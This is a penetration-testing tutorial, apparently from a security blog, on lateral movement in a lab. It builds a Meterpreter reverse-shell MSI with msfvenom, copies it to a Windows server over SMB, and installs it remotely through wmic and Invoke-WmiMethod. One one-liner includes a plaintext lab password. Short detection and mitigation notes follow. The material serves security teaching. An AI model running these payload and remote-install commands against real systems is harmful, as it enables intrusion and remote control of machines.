@@ -1,0 +1,99 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/" rel="category tag">Lateral Movement</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Lateral Movement: WMI</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/lateral-movement-wmi/" rel="bookmark"><time class="entry-date published" datetime="2020-05-03T08:58:00+00:00">May 3, 2020</time><time class="updated" datetime="2025-05-15T09:12:42+00:00">May 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">WMI is used for a lot of stuff, but it can also be used for Lateral Movement around the network. This can be achieved using the MSI file. Confused? Read along!</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Introduction to WMI</strong></span></li>
+<li><span style="color: #000000;"><strong>Configurations Used in Practical</strong></span></li>
+<li><span style="color: #000000;"><strong>Payload Crafting</strong></span></li>
+<li><span style="color: #000000;"><strong>Payload Transfer</strong></span></li>
+<li><span style="color: #000000;"><strong>Manual WMI</strong></span>
+<ul>
+<li><span style="color: #000000;">Getting the Meterpreter Session</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Invoke-WmiMethod</strong></span>
+<ul>
+<li><span style="color: #000000;">Getting the Meterpreter Session</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>One liner with Invoke-WmiMethod</strong></span>
+<ul>
+<li><span style="color: #000000;">Getting the Meterpreter Session</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Detection</strong></span></li>
+<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
+</ul>
+<h3><span style="color: #800000;">Introduction to WMI</span></h3>
+<p><span style="color: #000000;">WMI, or Windows Management Instrumentation, is a Windows feature used for Administration. It provides an environment for local and remote access to Windows Systems. It uses the WMI service for local, remote, SMB, RPCs. An attacker can use the WMI to access the WMI service and interact with the local and remote systems and can perform malicious activities like information gathering or Remote Execution of payloads for the Lateral Movement. It requires the User as well as Administrator Permissions to work at full capacity.</span></p>
+<p><span style="color: #000000;">As we discussed in the Introduction that WMI can work locally as well as remotely. We will be exploring both the possibilities.</span></p>
+<h3><span style="color: #800000;">Configurations used in Practical</span></h3>
+<p><span style="color: #000000;"><strong>Attacker:</strong></span></p>
+<p><span style="color: #000000;"><strong>    OS:</strong> Kali Linux 2020.1</span></p>
+<p><span style="color: #000000;"><strong>    IP:</strong> 192.168.1.112</span></p>
+<p><span style="color: #000000;"><strong>Target:</strong></span></p>
+<p><span style="color: #000000;"><strong>   Client OS:</strong> Windows 10</span></p>
+<p><span style="color: #000000;"><strong>   Server OS:</strong> Windows Server 2016</span></p>
+<p><span style="color: #000000;">    <strong>Server IP:</strong> 192.168.1.105</span></p>
+<h3><span style="color: #800000;">Payload Crafting</span></h3>
+<p><span style="color: #000000;">Installing an application is a tedious task on the Windows Server. There are uncountable restrictions that hinder if you are looking to install any payload. The Windows Installer or as it was known in the early days, Microsoft Installer from which this extension gets its name., “.msi” is the solution for this problem. Now we need to create a payload with the MSI extension. This led us to MSFvenom as it can help us to craft a payload to our requirements.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.112 lport=443 -f MSI &gt; raj.msi</pre>
+<h3><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-xscxYzEZvOs/Xq6EAS5CVgI/AAAAAAAAj1M/l3PeuY6wBQ8cPnOVghb1FkKtn54MB7MkgCLcBGAsYHQ/s1600/1.png" alt="Lateral Movement using WMI" width="879" height="155"/></h3>
+<h3><span style="color: #800000;"><strong>Payload Transfer</strong></span></h3>
+<p><span style="color: #000000;">Now that we have crafted the payload, we will send the application to the target machine. There are inexhaustible methods that can be used to transfer the target machine. As we can see in the image provided below that we have successfully transferred the malicious MSI file to the Target Machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-gHHMWabjnKY/Xq6EAYwNN7I/AAAAAAAAj1I/zBJG-T5I_EsGV6jeYsT6CsvPnPYR_Qz8gCLcBGAsYHQ/s1600/2.png"/></p>
+<h3><span style="color: #800000;"><strong>Manual WMI</strong></span></h3>
+<p><span style="color: #000000;">Now in this scenario, we have the physical access of one of the clients in the network. So, we decided a combination of net use, copy, and wmic command to first get access of the Administrator Account on the Server then copy the malicious MSI file from its location to a more obfuscated location, and then install it on the Target Server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net use \\192.168.1.105\c$ /user:administrator@ignite.local; copy C:\raj.msi \\192.168.1.105\c$\PerfLogs\setup.msi ; wmic /node:192.168.1.105 /user:administrator@ignite.local product call install PackageLocation=c:\PerfLogs\setup.msi</pre>
+<p><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-9FdakeX5pQc/Xq6EAV2fOKI/AAAAAAAAj1Q/xk1wMEJpHJcFnjnoLUTBmjasPrFJausvgCLcBGAsYHQ/s1600/3.png" alt="Lateral Movement using WMI" width="981" height="394"/></p>
+<p><span style="color: #000000;">It asks for the password for the Administrator user as shown in the image given above. After we enter the correct password it installs the MSI on the Target Server.</span></p>
+<h3><span style="color: #800000;">Getting the Meterpreter Session</span></h3>
+<p><span style="color: #000000;">Back on the attacker machine, we start a listener before installing the MSI file on the Target Server. We configure the listener to listen on the IP Address and the port that we used while crafting the payload. After the execution of the malicious MSI file, we have a meterpreter session on our attacker machine.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Lnyj_hCWl-Y/Xq6EBTJHwJI/AAAAAAAAj1U/qm81-HvatcovUDzpRz9lA_s3ts79dGvqACLcBGAsYHQ/s1600/4.png"/></p>
+<h3><span style="color: #800000;">Invoke-WmiMethod</span></h3>
+<p><span style="color: #000000;">That was one method to install the MSI file on the Target Server. There is another method as well. It involves the execution of the Invoke-WmiMethod cmdlet on the Client. This method can only be used if we have permission to execute Invoke-WmiMethod on the Client Machine. It is a built-in cmdlet.</span></p>
+<p><span style="color: #000000;">We already have crafted the payload in the previous practical and transferred it to the Target Machine. We will not perform those steps again. Back to the Client Machine.</span></p>
+<p><span style="color: #000000;">Here we open up an instance of PowerShell. Here we first use the combination of net use and copy command to transfer the malicious file to a more hidden location. Then we use the Invoke-WmiMethod to install the malicious file on the Target Server.</span></p>
+<p><span style="color: #000000;"><strong>-Path:</strong> Specifies the WMI object path of a WMI class, or specifies the WMI object path of an instance of a WMI class. Here we want to invoke a WMI object that is a win32_product. </span></p>
+<p><span style="color: #000000;"><strong>-name:</strong> Specifies the name of the method to be invoked.</span></p>
+<p><span style="color: #000000;">–<strong>argumentlist:</strong> Specifies the parameters to pass to the called method. The value of this parameter must be an array of objects, and they must appear in the order required by the called method.</span></p>
+<p><span style="color: #000000;"><strong>-ComputerName:</strong> Specifies, as a string array, the computers that this cmdlet runs the command on.</span></p>
+<p><span style="color: #000000;"><strong>-Credential:</strong> Specifies a user account that has permission to perform this action. Or in our case, we invoke a cmdlet that pops up a panel where we can enter the credentials.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net use \\192.168.1.105\c$ /user:administrator@ignite.local; copy C:\raj.msi \\192.168.1.105\c$\PerfLogs\setup.msi
+Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName WIN-S0V7KMTVLD2.ignite.local -Credential (Get-Credential)</pre>
+<pre class="lang:default decode:true "><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-3JIqlxDaWTc/Xq6EBq2ZgzI/AAAAAAAAj1Y/NVIQNpVMTA4xv7rE8O7N-KSJi71-fD3TgCLcBGAsYHQ/s1600/5.png" alt="Lateral Movement using WMI" width="862" height="541"/></pre>
+<h3><span style="color: #800000;">Getting the Meterpreter Session</span></h3>
+<p><span style="color: #000000;">Now as we did in the earlier practical, we started a listener with the same configurations we used while crafting the payload. As soon as we provide the credentials in the pop in the screenshot above. The WMI will install the malicious MSI file on the target server which results in the meterpreter as shown in the image given below.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-_5TMRNbcZtQ/Xq6EB4zCYlI/AAAAAAAAj1c/ez2_cgk-b5U5k78YfNeYbkRAuEu5Aaw0gCLcBGAsYHQ/s1600/6.png"/></p>
+<h3><span style="color: #800000;">One-liner with Invoke-WmiMethod</span></h3>
+<p><span style="color: #000000;">At last, we see another method to install an MSI file on the target server. This time we one-liner script that includes some variable declaring but it can ease our work for executing the WMI on the target server. This technique is useful when we don’t have an interactive console panel like cmd or PowerShell. You can also use this technique to execute the command remotely.</span><span style="color: #000000;"> First, we use the combination of the net use and copy command to transfer the MSI file to a more hidden location. Then we come to our one-liner.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-dMm7fA9KV2o/Xq6ECswP6WI/AAAAAAAAj1o/jbG88imOhRQ2McVCZ8k9FFpt-9nC8gBWQCLcBGAsYHQ/s1600/9.png" alt="Lateral Movement using WMI" width="604" height="442"/></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">$username = 'Administrator';$password = 'Ignite@987';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Invoke-WmiMethod -Path win32_product -name install -argumentlist @($true,"","c:\PerfLogs\setup.msi") -ComputerName WIN-S0V7KMTVLD2.ignite.local -Credential $credential</pre>
+<h3><img decoding="async" src="https://1.bp.blogspot.com/-wo0bIb4RQvI/Xq6ECe1QRKI/AAAAAAAAj1g/pl31RKdEzgQFMoWS02RAv150UG2kmxgogCLcBGAsYHQ/s1600/7.png"/></h3>
+<h3><span style="color: #800000;">Getting the Meterpreter</span></h3>
+<p><span style="color: #000000;">Now as we did in the earlier practical, we started a listener with the same configurations that were used while crafting the payload. As the credentials were already provided in the One-liner, the WMI will install the malicious MSI file on the target server which results in the meterpreter as shown in the image given below.</span></p>
+<p><strong><img loading="lazy" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-GhhJQzOx8M8/Xq6ECcobcUI/AAAAAAAAj1k/dFZsk28_CP8TNXZUmi1S5NITI7-W6_85wCLcBGAsYHQ/s1600/8.png" alt="Lateral Movement using WMI" width="583" height="248"/></strong></p>
+<h3><span style="color: #800000;">Detection</span></h3>
+<ul>
+<li><span style="color: #000000;">Monitor network traffic for WMI connections.</span></li>
+<li><span style="color: #000000;">The use of WMI in environments that do not typically use WMI may be suspect.</span></li>
+<li>
+<div class="output-content"><span style="color: #000000;">Monitor processes to capture command-line arguments of “wmic” and detect commands that users employ to perform remote behavior.</span></div>
+</li>
+</ul>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<div class="output-content"><span style="color: #000000;">By default, only administrators can connect remotely using WMI. Restrict other users from connecting, or disallow all users from connecting remotely to WMI.</span></div>
+<h3><span style="color: #800000;">Reference</span></h3>
+<p><span style="color: #000000;"><a style="color: #000000;" href="https://www.ired.team/offensive-security/lateral-movement/wmi-+-msi-lateral-movement">Ired Team</a></span></p>
+<p><span style="color: #000000;"><a style="color: #000000;" href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page">Microsoft WMI</a></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Can be Contacted on</span> <strong>Twitter</strong> <span style="color: #000000;">and </span><strong><a href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
